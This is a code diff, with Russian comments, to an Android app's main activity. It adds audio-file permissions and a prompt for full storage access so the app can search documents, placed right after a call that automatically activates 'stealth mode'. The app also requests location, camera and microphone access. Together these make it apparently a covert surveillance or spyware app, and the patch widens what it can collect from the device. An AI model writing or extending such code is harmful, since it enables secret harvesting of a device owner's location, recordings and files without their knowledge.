@@ -160,10 +160,11 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
 
         // Проверяем файловые разрешения отдельно для разных версий Android
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            // Android 13+
+            // Android 13+ — нужны отдельные разрешения для каждого типа медиа
             String[] mediaPermissions = {
                     Manifest.permission.READ_MEDIA_IMAGES,
-                    Manifest.permission.READ_MEDIA_VIDEO
+                    Manifest.permission.READ_MEDIA_VIDEO,
+                    Manifest.permission.READ_MEDIA_AUDIO  // ← для аудио-файлов
             };
             for (String permission : mediaPermissions) {
                 if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -188,23 +189,17 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
     }
 
     private void requestAllPermissions() {
-        String[] corePermissions = {
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO
-        };
-
         // Добавляем файловые разрешения в зависимости от версии Android
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            // Android 13+
+            // Android 13+ — нужны отдельные разрешения для каждого типа медиа
             String[] allPermissions = {
                     Manifest.permission.ACCESS_FINE_LOCATION,
                     Manifest.permission.ACCESS_COARSE_LOCATION,
                     Manifest.permission.CAMERA,
                     Manifest.permission.RECORD_AUDIO,
                     Manifest.permission.READ_MEDIA_IMAGES,
-                    Manifest.permission.READ_MEDIA_VIDEO
+                    Manifest.permission.READ_MEDIA_VIDEO,
+                    Manifest.permission.READ_MEDIA_AUDIO  // ← для аудио-файлов
             };
             ActivityCompat.requestPermissions(this, allPermissions, REQUEST_PERMISSIONS);
         } else {
@@ -259,6 +254,17 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
 
         // Автоматически активируем stealth режим
         activateStealthMode();
+
+        // Android 11+: запрашиваем MANAGE_EXTERNAL_STORAGE для доступа к документам
+        // (PDF, DOC, TXT и другие файлы не покрываются READ_MEDIA_*)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
+            new AlertDialog.Builder(this)
+                    .setTitle("Доступ к файлам")
+                    .setMessage("Для поиска документов (PDF, DOC, TXT и других) необходим полный доступ к хранилищу. Нажмите 'Разрешить' и включите переключатель.")
+                    .setPositiveButton("Разрешить", (dialog, which) -> requestStoragePermission())
+                    .setNegativeButton("Пропустить", null)
+                    .show();
+        }
     }
 
     // Активация stealth режима
